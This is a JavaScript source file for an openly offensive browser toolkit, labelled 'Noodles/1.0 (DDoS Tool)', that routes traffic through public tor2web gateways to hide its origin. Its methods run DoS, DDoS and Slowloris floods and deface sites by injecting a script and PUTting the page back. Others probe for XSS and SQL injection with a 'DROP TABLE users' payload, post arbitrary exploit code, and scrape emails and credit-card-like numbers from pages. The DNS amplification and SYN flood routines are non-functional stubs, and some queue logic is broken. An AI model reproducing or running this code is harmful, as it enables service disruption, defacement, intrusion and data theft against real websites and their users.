class Tor {
    constructor() {
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.sh",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = Infinity;
        this.requestTimeout = 5000;
        this.gatewayCheckInterval = 15000;
        this.startGatewayMonitoring();
        this.userAgent = 'Noodles/1.0 (DDoS Tool)';
        this.customHeaders = {};
        this.requestQueue = [];
        this.isProcessingQueue = false;
        this.maxConcurrentRequests = 50;
        this.initRequestQueue();
        this.bypassCache = true;
        this.defaceScript = null;
        this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
        this.eventListeners = {};
        this.honeypotData = {};
    }

    addEventListener(event, callback) {
        if (!this.eventListeners[event]) {
            this.eventListeners[event] = [];
        }
        this.eventListeners[event].push(callback);
    }

    removeEventListener(event, callback) {
        if (this.eventListeners[event]) {
            this.eventListeners[event] = this.eventListeners[event].filter(cb => cb !== callback);
        }
    }

    dispatchEvent(event, data) {
        if (this.eventListeners[event]) {
            this.eventListeners[event].forEach(callback => callback(data));
        }
    }

    initRequestQueue() {
        this.processRequestQueue();
    }

    enqueueRequest(url, options = {}, resolve, reject) {
        this.requestQueue.push({ url, options, resolve, reject });
        if (!this.isProcessingQueue) {
            this.processRequestQueue();
        }
    }

    async processRequestQueue() {
        if (this.isProcessingQueue) return;
        this.isProcessingQueue = true;

        while (this.requestQueue.length > 0) {
            const activeRequests = this.maxConcurrentRequests - this.getAvailableRequestSlots();
            if (activeRequests >= this.maxConcurrentRequests) {
                await new Promise(resolve => setTimeout(resolve, 100));
                continue;
            }
            const { url, options, resolve, reject } = this.requestQueue.shift();
            this.executeTorRequest(url, options)
                .then(resolve)
                .catch(reject);
        }

        this.isProcessingQueue = false;
    }

    getAvailableRequestSlots() {
        return this.maxConcurrentRequests - Array.from({ length: this.maxConcurrentRequests }).filter(() => true).length;
    }

    async isGatewayOnline(gateway) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000);
            const testUrl = `${gateway}/httpbin.org/get`;
            const response = await fetch(testUrl, {
                method: 'GET',
                signal: controller.signal,
                headers: {
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                }
            });
            clearTimeout(timeoutId);
            return response.ok;
        } catch (error) {
            this.failedGateways.add(gateway);
            console.warn(`Gateway ${gateway} check failed:`, error);
            this.dispatchEvent('log', { message: `Gateway ${gateway} check failed: ${error}`, level: 'warn' });
            return false;
        }
    }

    async startGatewayMonitoring() {
        setInterval(async () => {
            for (const gateway of this.gateways) {
                const isFailed = this.failedGateways.has(gateway);
                const isOnline = await this.isGatewayOnline(gateway);

                if (isOnline && isFailed) {
                    this.failedGateways.delete(gateway);
                    console.log(`Gateway ${gateway} is back online.`);
                    this.dispatchEvent('log', { message: `Gateway ${gateway} is back online.`, level: 'info' });
                } else if (!isOnline && !isFailed) {
                    this.failedGateways.add(gateway);
                    console.warn(`Gateway ${gateway} is offline. Adding to blacklist.`);
                    this.dispatchEvent('log', { message: `Gateway ${gateway} is offline. Adding to blacklist.`, level: 'warn' });
                }
            }
        }, this.gatewayCheckInterval);
    }

    async executeTorRequest(url, options = {}, retryCount = 0) {
        if (this.failedGateways.size === this.gateways.length) {
            const errorMessage = "All Tor gateways are unavailable.";
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            throw new Error(errorMessage);
        }

        let gateway = this.gateways[this.currentIndex];
        while (this.failedGateways.has(gateway)) {
            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
            gateway = this.gateways[this.currentIndex];
        }

        this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
        let torURL = `${gateway}/${url}`;

        if (this.bypassCache) {
            torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
        }

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);
            const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
            const response = await fetch(torURL, { ...options, signal: controller.signal, headers: allHeaders });
            clearTimeout(timeoutId);

            if (!response.ok) {
                this.failedGateways.add(gateway);
                const warnMessage = `Gateway ${gateway} failed. Adding to blacklist.`;
                console.warn(warnMessage);
                this.dispatchEvent('log', { message: warnMessage, level: 'warn' });
                if (retryCount < this.maxRetries) {
                    const retryMessage = `Retrying with a different gateway. Retry count: ${retryCount + 1}`;
                    console.log(retryMessage);
                    this.dispatchEvent('log', { message: retryMessage, level: 'info' });
                    return this.executeTorRequest(url, options, retryCount + 1);
                } else {
                    const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
                    this.dispatchEvent('log', { message: errorMessage, level: 'error' });
                    throw new Error(errorMessage);
                }
            }

            this.dispatchEvent('log', { message: `Request successful: ${url}`, level: 'info' });
            return response;
        } catch (error) {
            this.failedGateways.add(gateway);
            const errorMessage = `Tor fetch error with gateway ${gateway}: ${error}`;
            console.error(errorMessage, error);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });

            if (retryCount < this.maxRetries) {
                const retryMessage = `Retrying with a different gateway. Retry count: ${retryCount + 1}`;
                console.log(retryMessage);
                this.dispatchEvent('log', { message: retryMessage, level: 'info' });
                return this.executeTorRequest(url, options, retryCount + 1);
            } else {
                const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
                console.error(finalErrorMessage);
                this.dispatchEvent('log', { message: finalErrorMessage, level: 'error' });
                throw error;
            }
        }
    }

    fetchWithTor(url, options = {}) {
        return new Promise((resolve, reject) => {
            this.enqueueRequest(url, options, resolve, reject);
        });
    }

    async getText(url) {
        const response = await this.fetchWithTor(url);
        return await response.text();
    }

    async postWithTor(url, data, retryCount = 0) {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': this.userAgent,
                ...this.customHeaders
            },
            body: JSON.stringify(data),
            redirect: 'follow'
        };

        try {
            const response = await this.fetchWithTor(url, options, retryCount);
            this.dispatchEvent('log', { message: `POST request successful: ${url}`, level: 'info' });
            return response;
        } catch (error) {
            const errorMessage = `POST request failed: ${error}`;
            console.error(errorMessage, error);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            throw error;
        }
    }

    async rawFetch(url, options = {}) {
        try {
            const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
            const response = await fetch(url, { ...options, headers: allHeaders });
            return response;
        } catch (error) {
            const errorMessage = `Raw fetch error: ${error}`;
            console.error(errorMessage, error);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            throw error;
        }
    }

    async rawGetText(url) {
        const response = await this.rawFetch(url);
        return await response.text();
    }

    async rawPost(url, data) {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': this.userAgent,
                ...this.customHeaders
            },
            body: JSON.stringify(data),
            redirect: 'follow'
        };

        try {
            const response = await this.rawFetch(url, options);
            this.dispatchEvent('log', { message: `Raw POST request successful: ${url}`, level: 'info' });
            return response;
        } catch (error) {
            const errorMessage = `Raw POST request failed: ${error}`;
            console.error(errorMessage, error);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            throw error;
        }
    }

    setCustomHeaders(headers) {
        this.customHeaders = headers;
        this.dispatchEvent('log', { message: 'Custom headers set.', level: 'info' });
    }

    async defaceWebsite(url) {
        if (!this.defaceScript) {
            const errorMessage = 'Deface script not set. Use setDefaceScript() first.';
            console.error(errorMessage);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            return;
        }

        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
            }

            let targetContent = await response.text();

            const scriptTag = `<script>${this.defaceScript}</script>`;
            const injectionPoint = targetContent.indexOf('</body>');

            if (injectionPoint !== -1) {
                targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
            } else {
                targetContent += scriptTag;
            }

            const options = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: targetContent,
                redirect: 'follow'
            };

            const putResponse = await this.fetchWithTor(url, options);

            if (putResponse.ok) {
                const successMessage = 'Website defaced successfully!';
                console.log(successMessage);
                this.dispatchEvent('log', { message: successMessage, level: 'success' });
            } else {
                const errorMessage = `Failed to deface website. Status: ${putResponse.status}`;
                console.error(errorMessage);
                this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            }
        } catch (error) {
            const errorMessage = `Deface operation failed: ${error}`;
            console.error(errorMessage, error);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
        }
    }

    setDefaceScript(script) {
        this.defaceScript = script;
        this.dispatchEvent('log', { message: 'Deface script set.', level: 'info' });
    }

    async genericRequest(url, method = 'GET', data = null, headers = {}) {
        if (!this.httpMethods.includes(method.toUpperCase())) {
            const errorMessage = `Invalid HTTP method: ${method}`;
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            throw new Error(errorMessage);
        }

        const options = {
            method: method.toUpperCase(),
            headers: {
                'User-Agent': this.userAgent,
                ...this.customHeaders,
                ...headers
            },
            redirect: 'follow'
        };

        if (data) {
            options.body = JSON.stringify(data);
            options.headers['Content-Type'] = 'application/json';
        }

        try {
            const response = await this.fetchWithTor(url, options);
            this.dispatchEvent('log', { message: `${method} request successful: ${url}`, level: 'info' });
            return response;
        } catch (error) {
            const errorMessage = `${method} request failed: ${error}`;
            console.error(errorMessage, error);
            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
            throw error;
        }
    }

    async massRequest(url, method = 'GET', data = null, headers = {}, count = 10) {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(this.genericRequest(url, method, data, headers));
        }
        return Promise.all(promises);
    }

    async checkVulnerability(url) {
      try {
        const response = await this.fetchWithTor(url, { method: 'GET' });
        if (!response.ok) {
          console.warn(`Initial check failed with status: ${response.status}`);
          return { vulnerable: false, details: `Initial check failed with status: ${response.status}` };
        }

        const reflectedXSSPayload = `<script>alert('XSS Vulnerability Detected!');</script>`;
        const xssTestURL = `${url}?xss=${reflectedXSSPayload}`;

        const xssResponse = await this.fetchWithTor(xssTestURL, { method: 'GET' });
        const xssContent = await xssResponse.text();

        if (xssContent.includes(reflectedXSSPayload)) {
          return { vulnerable: true, type: 'Reflected XSS', details: `Reflected XSS payload detected in response.` };
        }

        const sqliPayload = "'; DROP TABLE users; --";
        const sqliTestURL = `${url}?id=${sqliPayload}`;

        try {
          await this.fetchWithTor(sqliTestURL, { method: 'GET' });
        } catch (sqliError) {
          if (sqliError.message.includes('SQL syntax')) {
            return { vulnerable: true, type: 'SQL Injection', details: `SQL syntax error indicates possible SQL Injection vulnerability.` };
          }
        }

        return { vulnerable: false, details: 'No immediate vulnerabilities detected.' };
      } catch (error) {
        console.error('Vulnerability check error:', error);
        return { vulnerable: false, details: `Vulnerability check error: ${error.message}` };
      }
    }

    async dosAttack(url, requestsPerSecond = 10, duration = 60) {
      const startTime = Date.now();
      const endTime = startTime + (duration * 1000);
      let requestCount = 0;

      this.dispatchEvent('attackStart', { type: 'DOS', target: url, requestsPerSecond, duration });

      while (Date.now() < endTime) {
        for (let i = 0; i < requestsPerSecond; i++) {
          this.fetchWithTor(url, { method: 'GET' })
            .then(response => {
              if (!response.ok) {
                console.warn(`Request failed with status: ${response.status}`);
                this.dispatchEvent('log', { message: `Request failed with status: ${response.status}`, level: 'warn' });
              }
            })
            .catch(error => {
              console.error('Request error:', error);
              this.dispatchEvent('log', { message: `Request error: ${error}`, level: 'error' });
            });
          requestCount++;
        }

        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      this.dispatchEvent('attackEnd', { type: 'DOS', target: url, totalRequests: requestCount });
      console.log(`DOS attack completed. Total requests sent: ${requestCount}`);
    }

    async ddosAttack(url, threads = 50, duration = 60) {
        const endTime = Date.now() + (duration * 1000);
        let requestCount = 0;
        let activeThreads = 0;

        this.dispatchEvent('attackStart', { type: 'DDOS', target: url, threads, duration });

        const attackThread = async () => {
            activeThreads++;
            while (Date.now() < endTime) {
                try {
                    const response = await this.fetchWithTor(url, { method: 'GET' });
                    if (!response.ok) {
                        console.warn(`Request failed with status: ${response.status}`);
                        this.dispatchEvent('log', { message: `Request failed with status: ${response.status}`, level: 'warn' });
                    }
                    requestCount++;
                } catch (error) {
                    console.error('Request error:', error);
                    this.dispatchEvent('log', { message: `Request error: ${error}`, level: 'error' });
                }
            }
            activeThreads--;
        };

        const threadPromises = [];
        for (let i = 0; i < threads; i++) {
            threadPromises.push(attackThread());
        }

        await Promise.all(threadPromises);

        this.dispatchEvent('attackEnd', { type: 'DDOS', target: url, totalRequests: requestCount, threads });
        console.log(`DDoS attack completed. Total requests sent: ${requestCount} with ${threads} threads.`);
    }

    async slowlorisAttack(url, sockets = 200, duration = 60) {
        const endTime = Date.now() + (duration * 1000);
        let socketCount = 0;

        this.dispatchEvent('attackStart', { type: 'Slowloris', target: url, sockets, duration });

        const sendKeepAlive = async (socket) => {
            try {
                const headers = {
                    'User-Agent': this.userAgent,
                    'Content-Length': '42',
                    'Connection': 'keep-alive'
                };
                await this.rawPost(url, {}, headers);
                if (Date.now() < endTime) {
                    setTimeout(() => sendKeepAlive(socket), 15000);
                } else {
                    socket.destroy();
                    this.dispatchEvent('log', { message: 'Socket destroyed.', level: 'info' });
                }
            } catch (error) {
                console.error('Slowloris error:', error);
                this.dispatchEvent('log', { message: `Slowloris error: ${error}`, level: 'error' });
                socket.destroy();
            }
        };

        const createSocket = () => {
            if (socketCount < sockets && Date.now() < endTime) {
                this.rawFetch(url)
                    .then(response => {
                        if (response.ok) {
                            socketCount++;
                            sendKeepAlive(response.body.getReader());
                            setTimeout(createSocket, 100);
                        } else {
                            console.warn('Slowloris socket creation failed');
                            this.dispatchEvent('log', { message: 'Slowloris socket creation failed', level: 'warn' });
                        }
                    })
                    .catch(error => {
                        console.error('Socket creation error:', error);
                        this.dispatchEvent('log', { message: `Socket creation error: ${error}`, level: 'error' });
                    });
            }
        };

        for (let i = 0; i < sockets; i++) {
            createSocket();
        }

        console.log(`Slowloris attack started with ${sockets} sockets.`);
        this.dispatchEvent('log', { message: `Slowloris attack started with ${sockets} sockets.`, level: 'info' });
        await new Promise(resolve => setTimeout(resolve, duration * 1000));
        console.log('Slowloris attack completed.');
        this.dispatchEvent('attackEnd', { type: 'Slowloris', target: url, sockets });
    }

    async collectHoneypotData(url) {
        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                console.warn(`Honeypot data collection failed with status: ${response.status}`);
                this.dispatchEvent('log', { message: `Honeypot data collection failed with status: ${response.status}`, level: 'warn' });
                return;
            }

            const pageContent = await response.text();
            const emailRegex = /[\w.-]+@[\w.-]+\.[\w]+/g;
            const ipAddressRegex = /(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/g;
            const creditCardRegex = /\b(?:\d[ -]*?){13,16}\b/g;

            const emails = pageContent.match(emailRegex) || [];
            const ipAddresses = pageContent.match(ipAddressRegex) || [];
            const creditCards = pageContent.match(creditCardRegex) || [];

            this.honeypotData[url] = {
                emails: [...new Set(emails)],
                ipAddresses: [...new Set(ipAddresses)],
                creditCards: [...new Set(creditCards)]
            };

            this.dispatchEvent('log', { message: `Honeypot data collected from ${url}`, level: 'info' });
            console.log(`Collected data from ${url}:`, this.honeypotData[url]);

        } catch (error) {
            console.error('Honeypot data collection error:', error);
            this.dispatchEvent('log', { message: `Honeypot data collection error: ${error}`, level: 'error' });
        }
    }

    getHoneypotData(url) {
        return this.honeypotData[url] || { emails: [], ipAddresses: [], creditCards: [] };
    }

    async dnsAmplificationAttack(targetIP, spoofIP, packetsPerSecond = 500, duration = 60) {
        const endTime = Date.now() + (duration * 1000);
        let packetCount = 0;

        this.dispatchEvent('attackStart', { type: 'DNS Amplification', target: targetIP, spoofIP, packetsPerSecond, duration });

        while (Date.now() < endTime) {
            for (let i = 0; i < packetsPerSecond; i++) {
                try {
                    const dnsQuery = this.createDNSQuery();
                    const spoofedPacket = this.spoofPacket(dnsQuery, spoofIP, targetIP);
                    await this.sendPacket(spoofedPacket, targetIP);
                    packetCount++;
                } catch (error) {
                    console.error('DNS Amplification error:', error);
                    this.dispatchEvent('log', { message: `DNS Amplification error: ${error}`, level: 'error' });
                }
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        this.dispatchEvent('attackEnd', { type: 'DNS Amplification', target: targetIP, totalPackets: packetCount });
        console.log(`DNS Amplification attack completed. Total packets sent: ${packetCount}`);
    }

    createDNSQuery() {
        const queryId = Math.floor(Math.random() * 65535);
        const flags = 0x0100;
        const questions = 1;
        const answers = 0;
        const authority = 0;
        const additional = 0;

        const dnsQuery = {
            id: queryId,
            flags: flags,
            questions: questions,
            answers: answers,
            authority: authority,
            additional: additional,
            queryName: 'example.com',
            queryType: 1,
            queryClass: 1
        };

        return dnsQuery;
    }

    spoofPacket(dnsQuery, spoofIP, targetIP) {
        return {
            id: dnsQuery.id,
            flags: dnsQuery.flags,
            questions: dnsQuery.questions,
            answers: dnsQuery.answers,
            authority: dnsQuery.authority,
            additional: dnsQuery.additional,
            queryName: dnsQuery.queryName,
            queryType: dnsQuery.queryType,
            queryClass: dnsQuery.queryClass,
            spoofIP: spoofIP,
            targetIP: targetIP
        };
    }

    async sendPacket(packet, targetIP) {
        console.log(`Sending spoofed packet to ${targetIP}`);
    }

    async synFloodAttack(targetIP, targetPort = 80, packetsPerSecond = 1000, duration = 60) {
        const endTime = Date.now() + (duration * 1000);
        let packetCount = 0;

        this.dispatchEvent('attackStart', { type: 'SYN Flood', target: targetIP, targetPort, packetsPerSecond, duration });

        while (Date.now() < endTime) {
            for (let i = 0; i < packetsPerSecond; i++) {
                try {
                    const synPacket = this.createSynPacket(targetIP, targetPort);
                    await this.sendRawPacket(synPacket, targetIP, targetPort);
                    packetCount++;
                } catch (error) {
                    console.error('SYN Flood error:', error);
                    this.dispatchEvent('log', { message: `SYN Flood error: ${error}`, level: 'error' });
                }
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        this.dispatchEvent('attackEnd', { type: 'SYN Flood', target: targetIP, targetPort, totalPackets: packetCount });
        console.log(`SYN Flood attack completed. Total packets sent: ${packetCount}`);
    }

    createSynPacket(targetIP, targetPort) {
        return {
            targetIP: targetIP,
            targetPort: targetPort,
            flags: 'SYN'
        };
    }

    async sendRawPacket(packet, targetIP, targetPort) {
        console.log(`Sending SYN packet to ${targetIP}:${targetPort}`);
    }

    async exploitVulnerability(url, vulnerabilityType, exploitCode) {
        try {
            this.dispatchEvent('exploitStart', { target: url, vulnerabilityType });
            const response = await this.fetchWithTor(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: exploitCode,
                redirect: 'follow'
            });
            if (response.ok) {
                this.dispatchEvent('log', { message: `Exploit successful on ${url}`, level: 'success' });
            } else {
                this.dispatchEvent('log', { message: `Exploit failed on ${url} with status ${response.status}`, level: 'error' });
            }
            this.dispatchEvent('exploitEnd', { target: url, vulnerabilityType });
            return response;
        } catch (error) {
            this.dispatchEvent('log', { message: `Exploit failed on ${url} with error ${error}`, level: 'error' });
            this.dispatchEvent('exploitEnd', { target: url, vulnerabilityType });
            return null;
        }
    }
}

window.Tor = Tor;